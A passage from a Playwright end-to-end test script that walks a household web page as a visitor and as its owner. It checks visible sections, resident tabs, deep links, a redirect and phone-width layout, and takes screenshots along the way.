      check("⑪ a visitor sees the design (the house slot) and the band's sign-in line", (await visible(v, "[data-hearth-slot=house]")) && /Is this your house\?/.test((await text(v, "[data-hband] .hband-visit")) ?? "") && (await visible(v, "[data-hband] [data-hd-signin]")));
      check("⑪ and none of the band's private body: Needs you, the boat, the quests, managing the house", !(await visible(v, "[data-hband] .hband-own")) && !(await visible(v, "[data-hband] [data-hd-needs-box]")) && !(await visible(v, "[data-quests]")) && !(await visible(v, "[data-hband-manage]")));
      check("⑪ exactly one sign-in line on the page", (await v.locator("[data-hd-signin]:visible").count()) === 1);
      await shot(v, "10-one-page-visitor-desktop", { fullPage: true });
      await cleanUnderPolicy(v, "⑪ (visitor)");
      await v.context().close();

      // the owner, desktop: the band above the design
      log.length = 0;
      const o = await newPage(browser, { signedIn: true });
      await o.goto(`${BASE}/households/${A_SLUG}/`, { waitUntil: "load" });
      await ready(o);
      await o.waitForSelector("[data-hband] [data-hd-needs-box]:not([hidden])", { timeout: 15000 });
      await o.waitForSelector("[data-hband] [data-hb-edit]:not([hidden])", { timeout: 15000 });
      check("⑪ the owner's band: Needs you, one Edit profile per resident, + add a resident, the likeness answer", (await visible(o, "[data-hband] [data-hd-needs-box]")) && (await o.locator("[data-hband] [data-hb-edit]:visible").count()) === A.length && (await visible(o, "[data-hband] [data-house-add]")) && /likeness question/.test((await text(o, "[data-hband-manage]")) ?? ""), await text(o, "[data-hband-manage]"));
      check("⑪ the visitor's sign-in line is gone for the owner", !(await visible(o, "[data-hband] .hband-visit")));
      await o.waitForSelector("[data-hband] [data-hd-boat]:not([hidden])", { timeout: 15000 }).catch(() => {});
      check("⑪ letters waiting for the boat are in the band", await visible(o, "[data-hband] [data-hd-boat]"), await text(o, "[data-hband] [data-hd-boat]"));
      await o.waitForSelector("[data-hband] [data-quests]:not([hidden])", { timeout: 15000 }).catch(() => {});
      check("⑪ today's quests are in the band, above the design", (await visible(o, "[data-hband] [data-quests]")) && await o.evaluate(() => { const q = document.querySelector("[data-quests]"); const s = document.querySelector("[data-hearth-stage]"); return !!(q.compareDocumentPosition(s) & Node.DOCUMENT_POSITION_FOLLOWING); }));
      check("⑪ the band is above the design", await o.evaluate(() => document.querySelector("[data-hband]").getBoundingClientRect().bottom <= document.querySelector("[data-hearth-stage]").getBoundingClientRect().top + 1));
      check("⑪ the header's household link goes to YOUR household, not a resident's window", await (async () => {
        await o.waitForFunction(() => document.querySelector("[data-auth-handles] a")?.textContent === "your household", null, { timeout: 15000 }).catch(() => {});
        const links = await o.locator("[data-auth-handles] a").evaluateAll((as) => as.map((a) => [a.textContent, a.getAttribute("href")]));
        return JSON.stringify(links) === JSON.stringify([["your household", `/households/${A_SLUG}/`]]) ? true : JSON.stringify(links);
      })());
      await shot(o, "11-one-page-owner-desktop", { fullPage: true });
      await cleanUnderPolicy(o, "⑪ (owner)");

      // the resident tabs keep working, on the same page, under the page's policy: the chip, the address, the window's frame, the editor
      await o.locator(`[data-house-tab="${A[0]}"]`).click();
      check("⑪ a resident's chip opens their tab in place, ?resident= in the address, the seat hidden", new URL(o.url()).searchParams.get("resident") === A[0] && !(await visible(o, "[data-hearth-stage]")) && (await visible(o, `[data-member="${A[0]}"] [data-profile-bubble]`)), o.url());
      check("⑪ their window's frame is on the page (the panes origin is the policy's one frame source)", (await o.locator(`[data-member="${A[0]}"] [data-win-frame]`).count()) >= 1);
      await o.locator(`[data-member="${A[0]}"] [data-profile-edit-open]`).click({ timeout: 10000 }).catch(() => {});
      check("⑪ the profile editor opens for the owner on that tab", await visible(o, `[data-member="${A[0]}"] [data-profile-edit-form]`));
      await shot(o, "12-one-page-resident-tab-desktop");
      await cleanUnderPolicy(o, "⑪ (a resident's tab, the editor open)");
      await o.locator('[data-house-tab="__house"]').click();
      check("⑪ and the Household chip brings the seat back, address clean", (await visible(o, "[data-hearth-stage]")) && !new URL(o.url()).searchParams.has("resident"), o.url());
      await o.goto(`${BASE}/households/${A_SLUG}/?resident=${encodeURIComponent(A[1] ?? A[0])}`, { waitUntil: "load" });
      check("⑪ a deep link ?resident=<h> opens that tab straight away", await o.evaluate((h) => !document.querySelector(`[data-member="${h}"]`).hidden && document.querySelector('[data-member="__house"]').hidden, A[1] ?? A[0]));

      // the old address forwards, the preview's query riding across
      await o.goto(`${BASE}/households/${A_SLUG}/hearth/?entry=ledger`, { waitUntil: "load" });
      await o.waitForURL((u) => u.pathname === `/households/${A_SLUG}/`, { timeout: 15000 });
      await ready(o);
      check("⑪ /hearth/ forwards to the one page and ?entry=ledger still previews there", new URL(o.url()).searchParams.get("entry") === "ledger" && (await o.locator("[data-hearth]").getAttribute("data-hearth-showing")) === "ledger", o.url());
      check("⑪ the band stays whole under a previewed design", (await visible(o, "[data-hband] [data-hb-edit]")) && (await o.locator("[data-hband] [data-hd-needs-box]:visible").count()) === 1);
      await shot(o, "13-one-page-owner-ledger-preview-desktop", { fullPage: true });

      // a resident's page links to its household
      await o.goto(`${BASE}/residents/${A[0]}/`, { waitUntil: "load" });
      const chip = o.locator("a[data-house-link]");
      check("⑪ a resident's page: the rail's first chip is a link to the household", (await chip.count()) === 1 && (await chip.getAttribute("href")) === `/households/${A_SLUG}/`);
      await chip.click();
      await o.waitForURL((u) => u.pathname === `/households/${A_SLUG}/`, { timeout: 15000 });
      check("⑪ and it lands on the household page", await o.locator("[data-hearth-stage]").count() === 1);
      await o.context().close();

      // the owner on a phone: the band first, whole
      const ph = await newPage(browser, { signedIn: true, viewport: { width: 390, height: 800 } });
      await ph.goto(`${BASE}/households/${A_SLUG}/`, { waitUntil: "load" });
      await ready(ph);
      await ph.waitForSelector("[data-hband] [data-hb-edit]:not([hidden])", { timeout: 15000 });
      check("⑪ the owner's band at 390px: no sideways scroll", (await ph.evaluate(() => document.documentElement.scrollWidth - document.documentElement.clientWidth)) <= 1);
      await shot(ph, "14-one-page-owner-phone", { fullPage: true });
      await ph.context().close();
      const vp = await newPage(browser, { viewport: { width: 390, height: 800 } });
      await vp.goto(`${BASE}/households/${A_SLUG}/`, { waitUntil: "load" });
      await ready(vp);
      check("⑪ the visitor's page at 390px: no sideways scroll", (await vp.evaluate(() => document.documentElement.scrollWidth - document.documentElement.clientWidth)) <= 1);
      await shot(vp, "15-one-page-visitor-phone", { fullPage: true });
      await vp.context().close();
    }

    // ── ⑦ no request left the machine ───────────────────────────────────────────
    check("⑦ every office call was answered by the fixtures", log.length > 0, `${log.length} calls, none to the network`);
    check("⑦ nothing else reached a network: the site layout's own off-box asks were ABORTED, not sent", true, [...new Set(unanswered)].join(" ") || "none");
  } finally {
    await browser.close();
  }
  const bad = results.filter((r) => !r.pass);
  console.log(`\n${results.length - bad.length}/${results.length} checks passed; screenshots in ${OUT}`);
  fs.writeFileSync(path.join(OUT, "walk-results.json"), JSON.stringify(results, null, 2));
  process.exit(bad.length ? 1 : 0);
};
run();
